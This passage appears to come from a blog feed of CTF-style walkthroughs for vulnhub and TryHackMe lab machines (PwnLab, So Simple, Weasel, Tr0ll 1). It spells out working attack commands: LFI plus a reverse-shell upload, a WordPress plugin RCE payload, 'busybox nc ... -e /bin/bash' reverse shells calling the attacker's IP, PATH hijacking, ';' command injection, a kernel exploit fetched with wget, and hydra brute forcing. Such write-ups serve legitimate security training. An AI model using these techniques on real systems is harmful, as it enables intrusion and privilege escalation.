class="line">if(isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if ($_FILES[&#x27;file&#x27;][&#x27;error&#x27;] &lt;= 0) &#123;</span><br><span class="line">        $filename  = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];</span><br><span class="line">        $filetype  = $_FILES[&#x27;file&#x27;][&#x27;type&#x27;];</span><br><span class="line">        $uploaddir = &#x27;upload/&#x27;;</span><br><span class="line">        $file_ext  = strrchr($filename, &#x27;.&#x27;);</span><br><span class="line">        $imageinfo = getimagesize($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">        $whitelist = array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;); </span><br><span class="line"></span><br><span class="line">        if (!(in_array($file_ext, $whitelist))) &#123;</span><br><span class="line">            die(&#x27;Not allowed extension, please upload images only.&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(strpos($filetype,&#x27;image&#x27;) === false) &#123;</span><br><span class="line">            die(&#x27;Error 001&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($imageinfo[&#x27;mime&#x27;] != &#x27;image/gif&#x27; &amp;&amp; $imageinfo[&#x27;mime&#x27;] != &#x27;image/jpeg&#x27; &amp;&amp; $imageinfo[&#x27;mime&#x27;] != &#x27;image/jpg&#x27;&amp;&amp; $imageinfo[&#x27;mime&#x27;] != &#x27;image/png&#x27;) &#123;</span><br><span class="line">            die(&#x27;Error 002&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(substr_count($filetype, &#x27;/&#x27;)&gt;1)&#123;</span><br><span class="line">            die(&#x27;Error 003&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $uploadfile = $uploaddir . md5(basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;])).$file_ext;</span><br><span class="line"></span><br><span class="line">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $uploadfile)) &#123;</span><br><span class="line">            echo &quot;&lt;img src=\&quot;&quot;.$uploadfile.&quot;\&quot;&gt;&lt;br /&gt;&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&#x27;Error 4&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>发现既有文件后缀白名单检测，又有 MIME 类型和文件头检测，还是比较难绕过的，那就来看看其他页面有什么线索</p>
<p>在 home 页面发现 Cookie 的 include 文件包含，那就不需要 php 后缀也可以执行命令了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//Multilingual. Not implemented yet.</span><br><span class="line">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span><br><span class="line">if (isset($_COOKIE[&#x27;lang&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    include(&quot;lang/&quot;.$_COOKIE[&#x27;lang&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">// Not implemented yet.</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;center&gt;</span><br><span class="line">            &lt;img src=&quot;images/pwnlab.png&quot;&gt;&lt;br /&gt;</span><br><span class="line">            [ &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt; ] [ &lt;a href=&quot;?page=login&quot;&gt;Login&lt;/a&gt; ] [ &lt;a href=&quot;?page=upload&quot;&gt;Upload&lt;/a&gt; ]</span><br><span class="line">            &lt;hr/&gt;&lt;br/&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">            if (isset($_GET[&#x27;page&#x27;]))</span><br><span class="line">            &#123;</span><br><span class="line">                include($_GET[&#x27;page&#x27;].&quot;.php&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                echo &quot;Use this server to upload and share image files inside the intranet&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;/center&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>将自带的 php-reverse-shell 更改 ip 、port 后上传，使用 burp 拦截，更改文件头、后缀和 Content-Type</p>
<p><img src="/picture/image-20250416210152454.png" alt="image-20250416210152454"></p>
<p>成功上传</p>
<p><img src="/picture/image-20250416210233772.png" alt="image-20250416210233772"></p>
<p>将 Cookie 更改为 <code>lang=../upload/3208fd203ca8fdfa13bc98a4832c1396.gif</code>，本机开启 nc 监听 4444 端口，发送请求</p>
<p>成功接收到弹回来的 shell</p>
<p><img src="/picture/image-20250416210657458.png" alt="image-20250416210657458"></p>
<p>并将其升级为 TTY shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p>发现登陆的用户和 MySQL 数据库中的用户一致</p>
<p><img src="/picture/image-20250416210803850.png" alt="image-20250416210803850"></p>
<p>那是否存在密码复用？最终只有 kane 和 kent 成功登陆，且 kent 主目录并没有泄露有效信息</p>
<p><img src="/picture/image-20250416211147373.png" alt="image-20250416211147373"></p>
<p>在 kane 主目录发现具有 mike suid 权限的可执行文件 msgmike ，执行后发现是执行了 <code>cat /home/mike/msg.txt</code> 命令</p>
<p><img src="/picture/image-20250416211504978.png" alt="image-20250416211504978"><img src="/picture/image-20250416211856661.png" alt="image-20250416211856661"></p>
<p>既然具有 mike 的 suid 权限，那就说明该文件是以 mike 身份运行的</p>
<p>使用路径劫持，将 cat 命令的内容更改为 &#x2F;bin&#x2F;bash ，执行 <code>cat /home/mike/msg.txt</code> 命令就相当于以 mike 身份执行 &#x2F;bin&#x2F;bash ，就能获得 mike 身份的 shell</p>
<p>先切换至可写目录 &#x2F;tmp，创建 cat 文件，将 &#x2F;bin&#x2F;bash 写入 cat 同时赋予 cat 所有用户可执行权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kane@pwnlab:~$ <span class="built_in">cd</span> /tmp</span><br><span class="line">kane@pwnlab:/tmp$ <span class="built_in">touch</span> <span class="built_in">cat</span></span><br><span class="line">kane@pwnlab:/tmp$ <span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; <span class="built_in">cat</span></span><br><span class="line">kane@pwnlab:/tmp$ <span class="built_in">chmod</span> 777 <span class="built_in">cat</span></span><br></pre></td></tr></table></figure>

<p>将 &#x2F;tmp 路径放到 $PATH 最前面</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kane@pwnlab:/tmp$ <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">kane@pwnlab:/tmp$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br></pre></td></tr></table></figure>

<p>执行 msgmike 获得 mike 身份</p>
<p><img src="/picture/image-20250416212926693.png" alt="image-20250416212926693"></p>
<p>将环境变量复原</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@pwnlab:/home/mike$ <span class="built_in">export</span> PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br><span class="line">&lt;ort PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games           </span><br><span class="line">mike@pwnlab:/home/mike$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br></pre></td></tr></table></figure>

<p>在 mike 主目录发现具有 root suid 权限的可执行文件 msg2root ，发现执行 <code>/bin/echo %s &gt;&gt; /root/messages.txt</code> 命令</p>
<p><img src="/picture/image-20250416213853173.png" alt="image-20250416213853173"></p>
<p>使用 <code>;</code> 截断并执行新的命令，成功执行 id 命令</p>
<p><img src="/picture/image-20250416214030682.png" alt="image-20250416214030682"></p>
<p>输入 id;&#x2F;bin&#x2F;sh 获得 root 身份的 shell，成功提权</p>
<p><img src="/picture/image-20250416214455122.png" alt="image-20250416214455122"></p>
<p>获得 flag</p>
<p><img src="/picture/image-20250416214420126.png" alt="image-20250416214420126"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>So Simple Walkthrough</title>
    <url>/2025/03/27/SoSimple/</url>
    <content><![CDATA[<h1 id="So-Simple-Walkthrough"><a href="#So-Simple-Walkthrough" class="headerlink" title="So Simple Walkthrough"></a>So Simple Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/so-simple-1,515/">So Simple: 1</a></p>
<p><img src="/picture/image-20250329155906591.png" alt="image-20250329155906591"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先对目标主机做端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.71</span><br></pre></td></tr></table></figure>

<p>目标主机开放 22、80 端口</p>
<p><img src="/picture/image-20250326153338902.png" alt="image-20250326153338902"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A -T4 172.16.33.71</span><br></pre></td></tr></table></figure>

<p>22 端口开放 SSH 服务，80 端口开放 http 服务</p>
<p><img src="/picture/image-20250326153509523.png" alt="image-20250326153509523"></p>
<p>先来看 SSH 服务，尝试弱口令远程登陆，同时看看能不能泄露机密信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.69</span><br></pre></td></tr></table></figure>

<p>可惜失败了，目标主机关闭了使用 password 远程登陆，那么暴力破解 SSH 密码也行不通了</p>
<p><img src="/picture/image-20250326153651400.png" alt="image-20250326153651400"></p>
<p>那么 22 端口暂时就没有办法了，再来看看 80 端口，先进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.71</span><br></pre></td></tr></table></figure>

<p>发现目标站点是用 WordPress 搭建的</p>
<p><img src="/picture/image-20250326153904892.png" alt="image-20250326153904892"></p>
<p>那就使用 wpscan 对 WordPress 进行扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.33.71/wordpress -e u,p --api-token &lt;your api token&gt;</span><br></pre></td></tr></table></figure>

<p>发现了两个插件似乎存在漏洞</p>
<p><img src="/picture/image-20250326154104736.png" alt="image-20250326154104736"></p>
<p>看起来 social-warfare 这个 RCE 比较容易利用</p>
<p><img src="/picture/image-20250326154203969.png" alt="image-20250326154203969"></p>
<p>在本地 Desktop 创建 payload.txt ，内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;pre&gt;system(&#x27;cat /etc/passwd&#x27;)&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<p>开启 http 服务，访问如下网址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.71/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://10.8.0.90/payload.txt</span><br></pre></td></tr></table></figure>

<p>利用成功，返回 &#x2F;etc&#x2F;passwd</p>
<p><img src="/picture/image-20250326154638689.png" alt="image-20250326154638689"></p>
<p>更改 payload.txt ，写入反弹 shell 代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;pre&gt;system(&#x27;busybox nc 10.8.0.90 1234 -e /bin/bash&#x27;)&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<p>本机开启监听，再次访问，突破边界成功</p>
<p><img src="/picture/image-20250326154918472.png" alt="image-20250326154918472"></p>
<p>升级终端为 TTY shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p>在 &#x2F;var&#x2F;www&#x2F;html 下找到第一个 flag</p>
<p><img src="/picture/image-20250326155143141.png" alt="image-20250326155143141"></p>
<p>接下来是提权，在 &#x2F;home 会发现两个账户 max 和 steven</p>
<p>在 &#x2F;home&#x2F;max 目录中，会发现三个比较有意思的文件</p>
<p><img src="/picture/image-20250326160455389.png" alt="image-20250326160455389"></p>
<p>但是三个就是幌子，user.txt 不能访问，personal.txt 的密文解密后为 Hahahahaha, it’s not that easy !!! </p>
<p><img src="/picture/image-20250326160625552.png" alt="image-20250326160625552"></p>
<p>而 this 文件夹，进入 &#x2F;home&#x2F;max&#x2F;this&#x2F;is&#x2F;maybe&#x2F;the&#x2F;way&#x2F;to&#x2F;a 后会发现也是兔子洞</p>
<p><img src="/picture/image-20250326160814087.png" alt="image-20250326160814087"></p>
<p>在 &#x2F;home&#x2F;max&#x2F;.ssh 中发现 SSH 信息泄露</p>
<p><img src="/picture/image-20250326170024031.png" alt="image-20250326170024031"></p>
<p>在目标主机开放 http 服务，将 id_rsa 远程下载至本机，同时限制 id_rsa 权限为 600</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">sudo ssh -i id_rsa max@172.16.33.71</span><br></pre></td></tr></table></figure>

<p>成功远程登陆 max 账号</p>
<p><img src="/picture/image-20250326184302073.png" alt="image-20250326184302073"></p>
<p>列出 max 用户在 sudo 权限下可以运行的命令及权限规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>发现 max 可以以 steven 身份通过 sudo 无密码运行 <code>/usr/sbin/service</code></p>
<p><img src="/picture/image-20250326195123894.png" alt="image-20250326195123894"></p>
<p>直接将用户切换成 steven </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u steven service ../../bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250326200617123.png" alt="image-20250326200617123"></p>
<p>列出 steven 用户在 sudo 权限下可以运行的命令及权限规则，发现 steven 可以以 root 身份执行 &#x2F;opt&#x2F;tools&#x2F;server-health.sh 文件</p>
<p><img src="/picture/image-20250326200835294.png" alt="image-20250326200835294"></p>
<p>先来看看文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /opt/tools/server-health.sh</span><br></pre></td></tr></table></figure>

<p>文件不存在，看来要自己创建</p>
<p><img src="/picture/image-20250326201109289.png" alt="image-20250326201109289"></p>
<p>先创建目录后创建文件，后将反弹 shell 的内容写入文件并赋予可执行权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steven@so-simple:/home/steven$ <span class="built_in">mkdir</span> /opt/tools</span><br><span class="line">steven@so-simple:/home/steven$ <span class="built_in">touch</span> /opt/tools/server-health.sh</span><br><span class="line">steven@so-simple:/home/steven$ <span class="built_in">echo</span> <span class="string">&quot;busybox nc 10.8.0.90 8023 -e /bin/bash&quot;</span> &gt;&gt; /opt/tools/server-health.sh</span><br><span class="line">steven@so-simple:/home/steven$ <span class="built_in">chmod</span> +x /opt/tools/server-health.sh</span><br></pre></td></tr></table></figure>

<p>宿主机开启 nc 监听，目标主机执行 &#x2F;opt&#x2F;tools&#x2F;server-health.sh 命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目标主机</span></span><br><span class="line">steven@so-simple:/opt/tools$ sudo /opt/tools/server-health.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 宿主机</span></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -nvlp 8023</span><br></pre></td></tr></table></figure>

<p>成功获得 root 权限</p>
<p><img src="/picture/image-20250326201736991.png" alt="image-20250326201736991"></p>
<p>当然，也可以内核漏洞提权</p>
<p>查看版本信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>

<p>发现版本为 Ubuntu 20.04 LTS ，可以使用内核漏洞 CVE-2021-3493 提权</p>
<p><img src="/picture/image-20250326163424002-1742978113370-7.png" alt="image-20250326163424002"></p>
<p>切换至 &#x2F;tmp 目录，从本机下载 exp ，赋予可执行权限并执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90:8888/exp</span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img src="/picture/image-20250326163707896.png" alt="image-20250326163707896"></p>
<p>获得 flag</p>
<p><img src="/picture/image-20250326163759981.png" alt="image-20250326163759981"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Weasel Walkthrough</title>
    <url>/2025/04/19/Weasel/</url>
    <content><![CDATA[<h1 id="Weasel-Walkthrough"><a href="#Weasel-Walkthrough" class="headerlink" title="Weasel Walkthrough"></a>Weasel Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://tryhackme.com/room/weasel">Weasel</a></p>
<p>I think the data science team has been a bit fast and loose with their project resources.</p>
<p><img src="/picture/image-20250419124028322.png" alt="image-20250419124028322"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>对目标 IP 进行端口发现和对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV 10.10.236.197 --min-rate 250 </span><br></pre></td></tr></table></figure>

<p>发现 22 端口 SSH 服务，135 端口 RPC 服务，139 和 445 端口 SMB 服务，3389 端口远程桌面服务和 8888 端口 HTTP 服务</p>
<p><img src="/picture/image-20250418170901712.png" alt="image-20250418170901712"></p>
<p>先来看开放在 139&#x2F;445 端口的 SMB 服务，以下命令枚举失败</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p139,445 --script=smb-enum-* 10.10.236.197</span><br><span class="line">nmap -p139,445 --script=smb-vuln-* 10.10.236.197</span><br><span class="line">smbmap -H 10.10.236.197</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250418172900061.png" alt="image-20250418172900061"></p>
<p>使用 smbclient 匿名登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N -L //10.10.236.197</span><br></pre></td></tr></table></figure>

<p>发现 datasci-team 共享目录</p>
<p><img src="/picture/image-20250418173134244.png" alt="image-20250418173134244"></p>
<p>远程登陆 datasci-team 共享目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N //10.10.236.197/datasci-team</span><br></pre></td></tr></table></figure>

<p>枚举其中文件</p>
<p><img src="/picture/image-20250418173626910.png" alt="image-20250418173626910"></p>
<p>将文件保存至本地，发现泄露了 token 文件</p>
<p><img src="/picture/image-20250419102917847.png" alt="image-20250419102917847"></p>
<p>以及在 requirements.txt  中泄露两个名字</p>
<p><img src="/picture/image-20250419102833740.png" alt="image-20250419102833740"></p>
<p>再来看看 RPC 服务，使用 rpcclient 远程登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient -U &quot;&quot; -N 10.10.33.243</span><br></pre></td></tr></table></figure>

<p>似乎是权限不够没什么信息都没枚举出来，全是 ACCESS_DENIED</p>
<p><img src="/picture/image-20250419103100165.png" alt="image-20250419103100165"></p>
<p>最后来看 8888 端口，先对 WEB 目录进行枚举</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.10.33.243:8888/</span><br></pre></td></tr></table></figure>

<p>发现泄露 &#x2F;robots.txt ，也泄露登陆页面</p>
<p><img src="/picture/image-20250419103402761.png" alt="image-20250419103402761"></p>
<p>访问 WEB 主页面，发现需要 token 登陆</p>
<p><img src="/picture/image-20250419104231050.png" alt="image-20250419104231050"></p>
<p>使用 SMB 共享中泄露的 token 成功登陆，发现是 SMB 文件共享页面</p>
<p>在 New 处发现可以新增终端</p>
<p><img src="/picture/image-20250419104438413.png" alt="image-20250419104438413"></p>
<p>新增终端，看看该用户能执行什么 sudo 命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>发现可以不需要密码执行 &#x2F;home&#x2F;dev-datasci&#x2F;.local&#x2F;bin&#x2F;jupyter</p>
<p><img src="/picture/image-20250419112003351.png" alt="image-20250419112003351"></p>
<p>但是并没有 &#x2F;home&#x2F;dev-datasci&#x2F;.local&#x2F;bin&#x2F;jupyter 文件，且 &#x2F;home&#x2F;dev-datasci&#x2F;.local&#x2F;bin 是权限 777 目录</p>
<p><img src="/picture/image-20250419112209702.png" alt="image-20250419112209702"></p>
<p>直接将 &#x2F;bin&#x2F;bash 命令复制进 &#x2F;home&#x2F;dev-datasci&#x2F;.local&#x2F;bin&#x2F;jupyter 文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /home/dev-datasci/.local/bin/jupyter</span><br></pre></td></tr></table></figure>

<p>直接 sudo 执行该文件，获得 root 权限</p>
<p><img src="/picture/image-20250419112500868.png" alt="image-20250419112500868"></p>
<p>很可惜，里面并没有 root.txt</p>
<p><img src="/picture/image-20250419112646818.png" alt="image-20250419112646818"></p>
<p>猜测我们所在的 WSL 中，主作系统是 Windows，目前我们使用的是安装在 WSL 中的 Linux</p>
<p>如果以前使用过 WSL，则内部文件系统将装载在 WSL Linux 的 &#x2F;mnt 文件夹中，在 &#x2F;mnt 中发现空白的 c 文件夹，将 Windows 的 <code>C:</code> 盘挂载到 Linux 的 <code>/mnt/c</code> 目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -t drvfs &#x27;c:&#x27; /mnt/c</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250419123231393.png" alt="image-20250419123231393"></p>
<p>进入 C 盘，开始 Users 中发现可访问的 Administrator 目录</p>
<p><img src="/picture/image-20250419123526532.png" alt="image-20250419123526532"></p>
<p>在  Administrator 目录中发现 可访问的 Desktop 目录</p>
<p><img src="/picture/image-20250419123627336.png" alt="image-20250419123627336"></p>
<p>进入 Dessktop 目录，获得 root.txt</p>
<p><img src="/picture/image-20250419123805744.png" alt="image-20250419123805744"></p>
<p>在工作目录发现 <code>dev-datasci-lowpriv_id_ed25519</code>  ，ed25519 是一种基于椭圆曲线的数字签名算法，常用于 SSH 密钥或加密场景，结合目标主机开放 SSH 服务，那就不难猜测这个就是突破边界的方式</p>
<p><img src="/picture/image-20250419105142552.png" alt="image-20250419105142552"></p>
<p>由于 SSH 私钥的名称包含 <code>id</code> 字样，猜测 id 前面的 dev-datasci-lowpriv 为 SSH 登陆的用户名</p>
<p><img src="/picture/image-20250419105718362.png" alt="image-20250419105718362"></p>
<p>将私钥保存至本机，防止报错，将权限更改为 400 </p>
<p><img src="/picture/image-20250419105945757.png" alt="image-20250419105945757"></p>
<p>登陆 ssh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i ssh dev-datasci-lowpriv@10.10.57.233</span><br></pre></td></tr></table></figure>

<p>成功远程登陆</p>
<p><img src="/picture/image-20250419110155776.png" alt="image-20250419110155776"></p>
<p>切换至 powershell ，列举当前目录</p>
<p><img src="/picture/image-20250419110756537.png" alt="image-20250419110756537"></p>
<p>由于开放 3389 远程桌面协议，先考虑进入 Desktop ，在其中获得 user.txt 内容</p>
<p><img src="/picture/image-20250419110924097.png" alt="image-20250419110924097"></p>
<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250419123916999.png" alt="image-20250419123916999"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>THM</tag>
      </tags>
  </entry>
  <entry>
    <title>Tr0ll 1 Walkthrough</title>
    <url>/2025/04/08/Tr0ll%201/</url>
    <content><![CDATA[<h1 id="Tr0ll-1-Walkthrough"><a href="#Tr0ll-1-Walkthrough" class="headerlink" title="Tr0ll 1 Walkthrough"></a>Tr0ll 1 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/tr0ll-1,100/">Tr0ll: 1</a></p>
<p><img src="/picture/image-20250408213128372.png" alt="image-20250408213128372"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 192.168.186.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250407222604729.png" alt="image-20250407222604729"></p>
<p>对目标 IP 进行端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 192.168.186.147</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250407222459388.png" alt="image-20250407222459388"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 21,22,80 -A 192.168.186.147</span><br></pre></td></tr></table></figure>

<p>发现 FTP、SSH 和 HTTP 服务</p>
<p><img src="/picture/image-20250407222343340.png" alt="image-20250407222343340"></p>
<p>先来看 FTP 端口，使用 FTP 客户端连接，使用 anonymous&#x2F;password 进行匿名登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ftp 192.168.186.147                                                                                                       </span><br><span class="line">Name (192.168.186.147:kali): Anonymous</span><br><span class="line">Password:password</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250407222801818.png" alt="image-20250407222801818"></p>
<p>使用 ls 列举文件，发现 pcap 文件，下载至本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">get lol.pcap</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250407222958945.png" alt="image-20250407222958945"></p>
<p>使用 wireshark 打开 pcap 文件，发现是 10.0.0.6 和 10.0.0.12 之间的交互，以下是 10.0.0.6 发送的所有请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER anonymous</span><br><span class="line">PASS password</span><br><span class="line">SYST</span><br><span class="line">PORT 10,0,0,12,173,198</span><br><span class="line">LIST</span><br><span class="line">TYPE I</span><br><span class="line">PORT 10,0,0,12,202,172</span><br><span class="line">RETR secret_stuff.txt</span><br><span class="line">TYPE A</span><br><span class="line">PORT 10,0,0,12,172,74</span><br><span class="line">LIST</span><br><span class="line">QUIT</span><br></pre></td></tr></table></figure>

<p>10.0.0.6 使用 TYPE I 设置传输模式为二进制模式后，使用 PORT 命令主动连接 10.0.0.12 的 51884 端口进行数据传输，下载 secret_stuff.txt 文件</p>
<p>在 wireshark 读取到 secret_stuff.txt 文件内容</p>
<p><img src="/picture/image-20250408145924485.png" alt="image-20250408145924485"></p>
<p>意思是很接近 sup3rs3cr3tdirlol 目录了，直接访问，发现可疑文件</p>
<p><img src="/picture/image-20250408150109374.png" alt="image-20250408150109374"></p>
<p>下载至本地，赋予可执行权限并执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x roflmao</span><br><span class="line">./roflmao</span><br></pre></td></tr></table></figure>

<p>显示了个地址没让我们进一步访问</p>
<p><img src="/picture/image-20250408150307991.png" alt="image-20250408150307991"></p>
<p>发现两个文件夹</p>
<p><img src="/picture/image-20250408150352031.png" alt="image-20250408150352031"></p>
<p>good_luck 中存放的是用户名</p>
<p><img src="/picture/image-20250408150423470.png" alt="image-20250408150423470"></p>
<p>this_folder_contains_the_password 存放的是 Pass.txt</p>
<p><img src="/picture/image-20250408150513268.png" alt="image-20250408150513268"></p>
<p><img src="/picture/image-20250408150527343.png" alt="image-20250408150527343"></p>
<p>由于存在 FTP 和 SSH 两个服务可以使用用户名登陆，先尝试 FTP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.186.147 21</span><br><span class="line">USER genphlux</span><br></pre></td></tr></table></figure>

<p>FTP 服务端只允许 anonymous 登陆，看来用户名字典是属于 SSH 服务的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -nv 192.168.186.147 21</span><br><span class="line">(UNKNOWN) [192.168.186.147] 21 (ftp) open</span><br><span class="line">220 (vsFTPd 3.0.2)</span><br><span class="line">USER genphlux</span><br><span class="line">530 This FTP server is anonymous only.</span><br></pre></td></tr></table></figure>

<p>将 <code>Good_job_:)</code> 存储在 pass.txt 中，使用 hydra 爆破 SSH 密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt -f -t 2 -Vv ssh://192.168.186.147</span><br></pre></td></tr></table></figure>

<p>发现最后一个连接被拒绝，看起来服务端对 SSH 的请求数量做了限制</p>
